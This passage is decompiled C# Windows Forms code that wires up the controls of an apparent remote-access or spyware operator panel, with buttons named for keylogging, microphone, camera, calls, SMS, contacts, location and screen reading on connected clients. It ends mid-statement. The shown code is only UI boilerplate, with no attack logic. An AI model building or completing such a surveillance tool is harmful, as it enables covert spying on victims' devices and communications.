		// (get) Token: 0x0600073C RID: 1852 RVA: 0x000056FD File Offset: 0x000038FD
		// (set) Token: 0x0600073D RID: 1853 RVA: 0x0003D108 File Offset: 0x0003B308
		internal virtual DrakeUITextBox searchtext
		{
			[CompilerGenerated]
			get
			{
				return this._searchtext;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.searchtext_TextChanged);
				DrakeUITextBox searchtext = this._searchtext;
				if (searchtext != null)
				{
					searchtext.TextChanged -= value2;
				}
				this._searchtext = value;
				searchtext = this._searchtext;
				if (searchtext != null)
				{
					searchtext.TextChanged += value2;
				}
			}
		}

		// Token: 0x170001BA RID: 442
		// (get) Token: 0x0600073E RID: 1854 RVA: 0x00005705 File Offset: 0x00003905
		// (set) Token: 0x0600073F RID: 1855 RVA: 0x0003D14C File Offset: 0x0003B34C
		internal virtual DrakeUIButtonIcon uncheckbtn
		{
			[CompilerGenerated]
			get
			{
				return this._uncheckbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.uncheckbtn_Click);
				DrakeUIButtonIcon uncheckbtn = this._uncheckbtn;
				if (uncheckbtn != null)
				{
					uncheckbtn.Click -= value2;
				}
				this._uncheckbtn = value;
				uncheckbtn = this._uncheckbtn;
				if (uncheckbtn != null)
				{
					uncheckbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001BB RID: 443
		// (get) Token: 0x06000740 RID: 1856 RVA: 0x0000570D File Offset: 0x0000390D
		// (set) Token: 0x06000741 RID: 1857 RVA: 0x0003D190 File Offset: 0x0003B390
		internal virtual PictureBox TCavatar { get; set; }

		// Token: 0x170001BC RID: 444
		// (get) Token: 0x06000742 RID: 1858 RVA: 0x00005715 File Offset: 0x00003915
		// (set) Token: 0x06000743 RID: 1859 RVA: 0x0003D1A4 File Offset: 0x0003B3A4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon8
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon8;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon8_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon8;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon8 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon8;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170001BD RID: 445
		// (get) Token: 0x06000744 RID: 1860 RVA: 0x0000571D File Offset: 0x0000391D
		// (set) Token: 0x06000745 RID: 1861 RVA: 0x0003D1E8 File Offset: 0x0003B3E8
		internal virtual DrakeUIButtonIcon HBlockbtn
		{
			[CompilerGenerated]
			get
			{
				return this._HBlockbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.HBlockbtn_Click);
				DrakeUIButtonIcon hblockbtn = this._HBlockbtn;
				if (hblockbtn != null)
				{
					hblockbtn.Click -= value2;
				}
				this._HBlockbtn = value;
				hblockbtn = this._HBlockbtn;
				if (hblockbtn != null)
				{
					hblockbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001BE RID: 446
		// (get) Token: 0x06000746 RID: 1862 RVA: 0x00005725 File Offset: 0x00003925
		// (set) Token: 0x06000747 RID: 1863 RVA: 0x0003D22C File Offset: 0x0003B42C
		internal virtual DrakeUIButtonIcon Hinfobtn
		{
			[CompilerGenerated]
			get
			{
				return this._Hinfobtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Hinfobtn_Click);
				DrakeUIButtonIcon hinfobtn = this._Hinfobtn;
				if (hinfobtn != null)
				{
					hinfobtn.Click -= value2;
				}
				this._Hinfobtn = value;
				hinfobtn = this._Hinfobtn;
				if (hinfobtn != null)
				{
					hinfobtn.Click += value2;
				}
			}
		}

		// Token: 0x170001BF RID: 447
		// (get) Token: 0x06000748 RID: 1864 RVA: 0x0000572D File Offset: 0x0000392D
		// (set) Token: 0x06000749 RID: 1865 RVA: 0x0003D270 File Offset: 0x0003B470
		internal virtual DrakeUIButtonIcon clientfoldrbtn
		{
			[CompilerGenerated]
			get
			{
				return this._clientfoldrbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.clientfoldrbtn_Click);
				DrakeUIButtonIcon clientfoldrbtn = this._clientfoldrbtn;
				if (clientfoldrbtn != null)
				{
					clientfoldrbtn.Click -= value2;
				}
				this._clientfoldrbtn = value;
				clientfoldrbtn = this._clientfoldrbtn;
				if (clientfoldrbtn != null)
				{
					clientfoldrbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001C0 RID: 448
		// (get) Token: 0x0600074A RID: 1866 RVA: 0x00005735 File Offset: 0x00003935
		// (set) Token: 0x0600074B RID: 1867 RVA: 0x0003D2B4 File Offset: 0x0003B4B4
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon9
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon9;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon9_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon9;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon9 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon9;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170001C1 RID: 449
		// (get) Token: 0x0600074C RID: 1868 RVA: 0x0000573D File Offset: 0x0000393D
		// (set) Token: 0x0600074D RID: 1869 RVA: 0x0003D2F8 File Offset: 0x0003B4F8
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon13
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon13;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon13_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon13;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon13 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon13;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170001C2 RID: 450
		// (get) Token: 0x0600074E RID: 1870 RVA: 0x00005745 File Offset: 0x00003945
		// (set) Token: 0x0600074F RID: 1871 RVA: 0x0003D33C File Offset: 0x0003B53C
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon12
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon12;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon12_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon12;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon12 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon12;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170001C3 RID: 451
		// (get) Token: 0x06000750 RID: 1872 RVA: 0x0000574D File Offset: 0x0000394D
		// (set) Token: 0x06000751 RID: 1873 RVA: 0x0003D380 File Offset: 0x0003B580
		internal virtual Label label16 { get; set; }

		// Token: 0x170001C4 RID: 452
		// (get) Token: 0x06000752 RID: 1874 RVA: 0x00005755 File Offset: 0x00003955
		// (set) Token: 0x06000753 RID: 1875 RVA: 0x0003D394 File Offset: 0x0003B594
		internal virtual DrakeUIContextMenuStrip ctxconnection { get; set; }

		// Token: 0x170001C5 RID: 453
		// (get) Token: 0x06000754 RID: 1876 RVA: 0x0000575D File Offset: 0x0000395D
		// (set) Token: 0x06000755 RID: 1877 RVA: 0x0003D3A8 File Offset: 0x0003B5A8
		internal virtual ToolStripMenuItem BlockClientToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._BlockClientToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.BlockClientToolStripMenuItem_Click);
				ToolStripMenuItem blockClientToolStripMenuItem = this._BlockClientToolStripMenuItem;
				if (blockClientToolStripMenuItem != null)
				{
					blockClientToolStripMenuItem.Click -= value2;
				}
				this._BlockClientToolStripMenuItem = value;
				blockClientToolStripMenuItem = this._BlockClientToolStripMenuItem;
				if (blockClientToolStripMenuItem != null)
				{
					blockClientToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001C6 RID: 454
		// (get) Token: 0x06000756 RID: 1878 RVA: 0x00005765 File Offset: 0x00003965
		// (set) Token: 0x06000757 RID: 1879 RVA: 0x0003D3EC File Offset: 0x0003B5EC
		internal virtual DrakeUITitlePanel blockpanel { get; set; }

		// Token: 0x170001C7 RID: 455
		// (get) Token: 0x06000758 RID: 1880 RVA: 0x0000576D File Offset: 0x0000396D
		// (set) Token: 0x06000759 RID: 1881 RVA: 0x0003D400 File Offset: 0x0003B600
		public virtual DataGridView DGVblocked { get; set; }

		// Token: 0x170001C8 RID: 456
		// (get) Token: 0x0600075A RID: 1882 RVA: 0x00005775 File Offset: 0x00003975
		// (set) Token: 0x0600075B RID: 1883 RVA: 0x0003D414 File Offset: 0x0003B614
		internal virtual DataGridViewImageColumn DataGridViewImageColumn1 { get; set; }

		// Token: 0x170001C9 RID: 457
		// (get) Token: 0x0600075C RID: 1884 RVA: 0x0000577D File Offset: 0x0000397D
		// (set) Token: 0x0600075D RID: 1885 RVA: 0x0003D428 File Offset: 0x0003B628
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1 { get; set; }

		// Token: 0x17000240 RID: 576
		// (get) Token: 0x0600075E RID: 1886 RVA: 0x00005785 File Offset: 0x00003985
		// (set) Token: 0x0600075F RID: 1887 RVA: 0x0003D43C File Offset: 0x0003B63C
		internal virtual DrakeUIContextMenuStrip ctxconnection_1 { get; set; }

		// Token: 0x170001CA RID: 458
		// (get) Token: 0x06000760 RID: 1888 RVA: 0x0000578D File Offset: 0x0000398D
		// (set) Token: 0x06000761 RID: 1889 RVA: 0x0003D450 File Offset: 0x0003B650
		internal virtual ToolStripMenuItem ToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ToolStripMenuItem1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem1_Click);
				ToolStripMenuItem toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click -= value2;
				}
				this._ToolStripMenuItem1 = value;
				toolStripMenuItem = this._ToolStripMenuItem1;
				if (toolStripMenuItem != null)
				{
					toolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001CB RID: 459
		// (get) Token: 0x06000762 RID: 1890 RVA: 0x00005795 File Offset: 0x00003995
		// (set) Token: 0x06000763 RID: 1891 RVA: 0x0003D494 File Offset: 0x0003B694
		internal virtual DrakeUIAvatar clearsrchbtn
		{
			[CompilerGenerated]
			get
			{
				return this._clearsrchbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.clearsrchbtn_Click);
				DrakeUIAvatar clearsrchbtn = this._clearsrchbtn;
				if (clearsrchbtn != null)
				{
					clearsrchbtn.Click -= value2;
				}
				this._clearsrchbtn = value;
				clearsrchbtn = this._clearsrchbtn;
				if (clearsrchbtn != null)
				{
					clearsrchbtn.Click += value2;
				}
			}
		}

		// Token: 0x17000241 RID: 577
		// (get) Token: 0x06000764 RID: 1892 RVA: 0x0000579D File Offset: 0x0000399D
		// (set) Token: 0x06000765 RID: 1893 RVA: 0x0003D4D8 File Offset: 0x0003B6D8
		internal virtual System.Windows.Forms.Timer mapupdater
		{
			[CompilerGenerated]
			get
			{
				return this._mapupdater;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.mapupdater_Tick);
				System.Windows.Forms.Timer mapupdater = this._mapupdater;
				if (mapupdater != null)
				{
					mapupdater.Tick -= value2;
				}
				this._mapupdater = value;
				mapupdater = this._mapupdater;
				if (mapupdater != null)
				{
					mapupdater.Tick += value2;
				}
			}
		}

		// Token: 0x17000242 RID: 578
		// (get) Token: 0x06000766 RID: 1894 RVA: 0x000057A5 File Offset: 0x000039A5
		// (set) Token: 0x06000767 RID: 1895 RVA: 0x0003D51C File Offset: 0x0003B71C
		internal virtual DrakeUIToolTip ToolTips { get; set; }

		// Token: 0x170001CC RID: 460
		// (get) Token: 0x06000768 RID: 1896 RVA: 0x000057AD File Offset: 0x000039AD
		// (set) Token: 0x06000769 RID: 1897 RVA: 0x0003D530 File Offset: 0x0003B730
		internal virtual DataGridViewImageColumn DataGridViewImageColumn2 { get; set; }

		// Token: 0x170001CD RID: 461
		// (get) Token: 0x0600076A RID: 1898 RVA: 0x000057B5 File Offset: 0x000039B5
		// (set) Token: 0x0600076B RID: 1899 RVA: 0x0003D544 File Offset: 0x0003B744
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5 { get; set; }

		// Token: 0x170001CE RID: 462
		// (get) Token: 0x0600076C RID: 1900 RVA: 0x000057BD File Offset: 0x000039BD
		// (set) Token: 0x0600076D RID: 1901 RVA: 0x0003D558 File Offset: 0x0003B758
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4 { get; set; }

		// Token: 0x170001CF RID: 463
		// (get) Token: 0x0600076E RID: 1902 RVA: 0x000057C5 File Offset: 0x000039C5
		// (set) Token: 0x0600076F RID: 1903 RVA: 0x0003D56C File Offset: 0x0003B76C
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn7 { get; set; }

		// Token: 0x170001D0 RID: 464
		// (get) Token: 0x06000770 RID: 1904 RVA: 0x000057CD File Offset: 0x000039CD
		// (set) Token: 0x06000771 RID: 1905 RVA: 0x0003D580 File Offset: 0x0003B780
		internal virtual DataGridViewTextBoxColumn dattim { get; set; }

		// Token: 0x170001D1 RID: 465
		// (get) Token: 0x06000772 RID: 1906 RVA: 0x000057D5 File Offset: 0x000039D5
		// (set) Token: 0x06000773 RID: 1907 RVA: 0x0003D594 File Offset: 0x0003B794
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170001D2 RID: 466
		// (get) Token: 0x06000774 RID: 1908 RVA: 0x000057DD File Offset: 0x000039DD
		// (set) Token: 0x06000775 RID: 1909 RVA: 0x0003D5D8 File Offset: 0x0003B7D8
		internal virtual DrakeUIButtonIcon locationbtn
		{
			[CompilerGenerated]
			get
			{
				return this._locationbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.locationbtn_Click);
				DrakeUIButtonIcon locationbtn = this._locationbtn;
				if (locationbtn != null)
				{
					locationbtn.Click -= value2;
				}
				this._locationbtn = value;
				locationbtn = this._locationbtn;
				if (locationbtn != null)
				{
					locationbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001D3 RID: 467
		// (get) Token: 0x06000776 RID: 1910 RVA: 0x000057E5 File Offset: 0x000039E5
		// (set) Token: 0x06000777 RID: 1911 RVA: 0x0003D61C File Offset: 0x0003B81C
		internal virtual DrakeUIButtonIcon keyloggerbtn
		{
			[CompilerGenerated]
			get
			{
				return this._keyloggerbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.keyloggerbtn_Click);
				DrakeUIButtonIcon keyloggerbtn = this._keyloggerbtn;
				if (keyloggerbtn != null)
				{
					keyloggerbtn.Click -= value2;
				}
				this._keyloggerbtn = value;
				keyloggerbtn = this._keyloggerbtn;
				if (keyloggerbtn != null)
				{
					keyloggerbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001D4 RID: 468
		// (get) Token: 0x06000778 RID: 1912 RVA: 0x000057ED File Offset: 0x000039ED
		// (set) Token: 0x06000779 RID: 1913 RVA: 0x0003D660 File Offset: 0x0003B860
		internal virtual DrakeUIButtonIcon callsbtn
		{
			[CompilerGenerated]
			get
			{
				return this._callsbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.callsbtn_Click);
				DrakeUIButtonIcon callsbtn = this._callsbtn;
				if (callsbtn != null)
				{
					callsbtn.Click -= value2;
				}
				this._callsbtn = value;
				callsbtn = this._callsbtn;
				if (callsbtn != null)
				{
					callsbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001D5 RID: 469
		// (get) Token: 0x0600077A RID: 1914 RVA: 0x000057F5 File Offset: 0x000039F5
		// (set) Token: 0x0600077B RID: 1915 RVA: 0x0003D6A4 File Offset: 0x0003B8A4
		internal virtual DrakeUIButtonIcon micbtn
		{
			[CompilerGenerated]
			get
			{
				return this._micbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.micbtn_Click);
				DrakeUIButtonIcon micbtn = this._micbtn;
				if (micbtn != null)
				{
					micbtn.Click -= value2;
				}
				this._micbtn = value;
				micbtn = this._micbtn;
				if (micbtn != null)
				{
					micbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001D6 RID: 470
		// (get) Token: 0x0600077C RID: 1916 RVA: 0x000057FD File Offset: 0x000039FD
		// (set) Token: 0x0600077D RID: 1917 RVA: 0x0003D6E8 File Offset: 0x0003B8E8
		internal virtual DrakeUIButtonIcon accountbtn
		{
			[CompilerGenerated]
			get
			{
				return this._accountbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.accountbtn_Click);
				DrakeUIButtonIcon accountbtn = this._accountbtn;
				if (accountbtn != null)
				{
					accountbtn.Click -= value2;
				}
				this._accountbtn = value;
				accountbtn = this._accountbtn;
				if (accountbtn != null)
				{
					accountbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001D7 RID: 471
		// (get) Token: 0x0600077E RID: 1918 RVA: 0x00005805 File Offset: 0x00003A05
		// (set) Token: 0x0600077F RID: 1919 RVA: 0x0003D72C File Offset: 0x0003B92C
		internal virtual DrakeUIButtonIcon camerabtn
		{
			[CompilerGenerated]
			get
			{
				return this._camerabtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.camerabtn_Click);
				DrakeUIButtonIcon camerabtn = this._camerabtn;
				if (camerabtn != null)
				{
					camerabtn.Click -= value2;
				}
				this._camerabtn = value;
				camerabtn = this._camerabtn;
				if (camerabtn != null)
				{
					camerabtn.Click += value2;
				}
			}
		}

		// Token: 0x170001D8 RID: 472
		// (get) Token: 0x06000780 RID: 1920 RVA: 0x0000580D File Offset: 0x00003A0D
		// (set) Token: 0x06000781 RID: 1921 RVA: 0x0003D770 File Offset: 0x0003B970
		internal virtual DrakeUIButtonIcon applicationsbtn
		{
			[CompilerGenerated]
			get
			{
				return this._applicationsbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.applicationsbtn_Click);
				DrakeUIButtonIcon applicationsbtn = this._applicationsbtn;
				if (applicationsbtn != null)
				{
					applicationsbtn.Click -= value2;
				}
				this._applicationsbtn = value;
				applicationsbtn = this._applicationsbtn;
				if (applicationsbtn != null)
				{
					applicationsbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001D9 RID: 473
		// (get) Token: 0x06000782 RID: 1922 RVA: 0x00005815 File Offset: 0x00003A15
		// (set) Token: 0x06000783 RID: 1923 RVA: 0x0003D7B4 File Offset: 0x0003B9B4
		internal virtual DrakeUIButtonIcon screenbtn
		{
			[CompilerGenerated]
			get
			{
				return this._screenbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.screenbtn_Click);
				DrakeUIButtonIcon screenbtn = this._screenbtn;
				if (screenbtn != null)
				{
					screenbtn.Click -= value2;
				}
				this._screenbtn = value;
				screenbtn = this._screenbtn;
				if (screenbtn != null)
				{
					screenbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001DA RID: 474
		// (get) Token: 0x06000784 RID: 1924 RVA: 0x0000581D File Offset: 0x00003A1D
		// (set) Token: 0x06000785 RID: 1925 RVA: 0x0003D7F8 File Offset: 0x0003B9F8
		internal virtual DrakeUIButtonIcon contactbtn
		{
			[CompilerGenerated]
			get
			{
				return this._contactbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.contactbtn_Click);
				DrakeUIButtonIcon contactbtn = this._contactbtn;
				if (contactbtn != null)
				{
					contactbtn.Click -= value2;
				}
				this._contactbtn = value;
				contactbtn = this._contactbtn;
				if (contactbtn != null)
				{
					contactbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001DB RID: 475
		// (get) Token: 0x06000786 RID: 1926 RVA: 0x00005825 File Offset: 0x00003A25
		// (set) Token: 0x06000787 RID: 1927 RVA: 0x0003D83C File Offset: 0x0003BA3C
		internal virtual DrakeUIButtonIcon screenreadbtn
		{
			[CompilerGenerated]
			get
			{
				return this._screenreadbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.screenreadbtn_Click);
				DrakeUIButtonIcon screenreadbtn = this._screenreadbtn;
				if (screenreadbtn != null)
				{
					screenreadbtn.Click -= value2;
				}
				this._screenreadbtn = value;
				screenreadbtn = this._screenreadbtn;
				if (screenreadbtn != null)
				{
					screenreadbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001DC RID: 476
		// (get) Token: 0x06000788 RID: 1928 RVA: 0x0000582D File Offset: 0x00003A2D
		// (set) Token: 0x06000789 RID: 1929 RVA: 0x0003D880 File Offset: 0x0003BA80
		internal virtual DrakeUIButtonIcon filebtn
		{
			[CompilerGenerated]
			get
			{
				return this._filebtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.filebtn_Click);
				DrakeUIButtonIcon filebtn = this._filebtn;
				if (filebtn != null)
				{
					filebtn.Click -= value2;
				}
				this._filebtn = value;
				filebtn = this._filebtn;
				if (filebtn != null)
				{
					filebtn.Click += value2;
				}
			}
		}

		// Token: 0x170001DD RID: 477
		// (get) Token: 0x0600078A RID: 1930 RVA: 0x00005835 File Offset: 0x00003A35
		// (set) Token: 0x0600078B RID: 1931 RVA: 0x0003D8C4 File Offset: 0x0003BAC4
		internal virtual DrakeUIButtonIcon smsbtn
		{
			[CompilerGenerated]
			get
			{
				return this._smsbtn;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.smsbtn_Click);
				DrakeUIButtonIcon smsbtn = this._smsbtn;
				if (smsbtn != null)
				{
					smsbtn.Click -= value2;
				}
				this._smsbtn = value;
				smsbtn = this._smsbtn;
				if (smsbtn != null)
				{
					smsbtn.Click += value2;
				}
			}
		}

		// Token: 0x170001DE RID: 478
		// (get) Token: 0x0600078C RID: 1932 RVA: 0x0000583D File Offset: 0x00003A3D
		// (set) Token: 0x0600078D RID: 1933 RVA: 0x0003D908 File Offset: 0x0003BB08
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170001DF RID: 479
		// (get) Token: 0x0600078E RID: 1934 RVA: 0x00005845 File Offset: 0x00003A45
		// (set) Token: 0x0600078F RID: 1935 RVA: 0x0003D94C File Offset: 0x0003BB4C
		internal virtual Panel Panel5 { get; set; }

		// Token: 0x170001E0 RID: 480
		// (get) Token: 0x06000790 RID: 1936 RVA: 0x0000584D File Offset: 0x00003A4D
		// (set) Token: 0x06000791 RID: 1937 RVA: 0x0003D960 File Offset: 0x0003BB60
		internal virtual DrakeUITitlePanel callspanel { get; set; }

		// Token: 0x170001E1 RID: 481
		// (get) Token: 0x06000792 RID: 1938 RVA: 0x00005855 File Offset: 0x00003A55
		// (set) Token: 0x06000793 RID: 1939 RVA: 0x0003D974 File Offset: 0x0003BB74
		internal virtual DrakeUITitlePanel notifispanel { get; set; }

		// Token: 0x170001E2 RID: 482
		// (get) Token: 0x06000794 RID: 1940 RVA: 0x0000585D File Offset: 0x00003A5D
		// (set) Token: 0x06000795 RID: 1941 RVA: 0x0003D988 File Offset: 0x0003BB88
		internal virtual DataGridView DGVNOTF { get; set; }

		// Token: 0x170001E3 RID: 483
		// (get) Token: 0x06000796 RID: 1942 RVA: 0x00005865 File Offset: 0x00003A65
		// (set) Token: 0x06000797 RID: 1943 RVA: 0x0003D99C File Offset: 0x0003BB9C
		internal virtual DrakeUITitlePanel mappanel { get; set; }

		// Token: 0x170001E4 RID: 484
		// (get) Token: 0x06000798 RID: 1944 RVA: 0x0000586D File Offset: 0x00003A6D
		// (set) Token: 0x06000799 RID: 1945 RVA: 0x0003D9B0 File Offset: 0x0003BBB0
		internal virtual Panel MapPannel { get; set; }

		// Token: 0x170001E5 RID: 485
		// (get) Token: 0x0600079A RID: 1946 RVA: 0x00005875 File Offset: 0x00003A75
		// (set) Token: 0x0600079B RID: 1947 RVA: 0x0003D9C4 File Offset: 0x0003BBC4
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x170001E6 RID: 486
		// (get) Token: 0x0600079C RID: 1948 RVA: 0x0000587D File Offset: 0x00003A7D
		// (set) Token: 0x0600079D RID: 1949 RVA: 0x0003D9D8 File Offset: 0x0003BBD8
		internal virtual DataGridView DGVCALLS { get; set; }

		// Token: 0x170001E7 RID: 487
		// (get) Token: 0x0600079E RID: 1950 RVA: 0x00005885 File Offset: 0x00003A85
		// (set) Token: 0x0600079F RID: 1951 RVA: 0x0003D9EC File Offset: 0x0003BBEC
		internal virtual DataGridViewImageColumn DataGridViewImageColumn3 { get; set; }

		// Token: 0x170001E8 RID: 488
		// (get) Token: 0x060007A0 RID: 1952 RVA: 0x0000588D File Offset: 0x00003A8D
		// (set) Token: 0x060007A1 RID: 1953 RVA: 0x0003DA00 File Offset: 0x0003BC00
		internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2 { get; set; }

		// Token: 0x170001E9 RID: 489
		// (get) Token: 0x060007A2 RID: 1954 RVA: 0x00005895 File Offset: 0x00003A95
		// (set) Token: 0x060007A3 RID: 1955 RVA: 0x0003DA14 File Offset: 0x0003BC14
		internal virtual DataGridViewImageColumn cliimg { get; set; }

		// Token: 0x170001EA RID: 490
		// (get) Token: 0x060007A4 RID: 1956 RVA: 0x0000589D File Offset: 0x00003A9D
		// (set) Token: 0x060007A5 RID: 1957 RVA: 0x0003DA28 File Offset: 0x0003BC28
		internal virtual DataGridViewTextBoxColumn notitext { get; set; }

		// Token: 0x17000243 RID: 579
		// (get) Token: 0x060007A6 RID: 1958 RVA: 0x000058A5 File Offset: 0x00003AA5
		// (set) Token: 0x060007A7 RID: 1959 RVA: 0x0003DA3C File Offset: 0x0003BC3C
		internal virtual DrakeUIContextMenuStrip DrakeUIContextMenuStrip1 { get; set; }

		// Token: 0x170001EB RID: 491
		// (get) Token: 0x060007A8 RID: 1960 RVA: 0x000058AD File Offset: 0x00003AAD
		// (set) Token: 0x060007A9 RID: 1961 RVA: 0x0003DA50 File Offset: 0x0003BC50
		internal virtual ToolStripMenuItem ManagersToolStripMenuItem { get; set; }

		// Token: 0x170001EC RID: 492
		// (get) Token: 0x060007AA RID: 1962 RVA: 0x000058B5 File Offset: 0x00003AB5
		// (set) Token: 0x060007AB RID: 1963 RVA: 0x0003DA64 File Offset: 0x0003BC64
		internal virtual ToolStripMenuItem FilesToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._FilesToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.FilesToolStripMenuItem_Click);
				ToolStripMenuItem filesToolStripMenuItem = this._FilesToolStripMenuItem;
				if (filesToolStripMenuItem != null)
				{
					filesToolStripMenuItem.Click -= value2;
				}
				this._FilesToolStripMenuItem = value;
				filesToolStripMenuItem = this._FilesToolStripMenuItem;
				if (filesToolStripMenuItem != null)
				{
					filesToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001ED RID: 493
		// (get) Token: 0x060007AC RID: 1964 RVA: 0x000058BD File Offset: 0x00003ABD
		// (set) Token: 0x060007AD RID: 1965 RVA: 0x0003DAA8 File Offset: 0x0003BCA8
		internal virtual ToolStripMenuItem SMSToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SMSToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SMSToolStripMenuItem_Click);
				ToolStripMenuItem smstoolStripMenuItem = this._SMSToolStripMenuItem;
				if (smstoolStripMenuItem != null)
				{
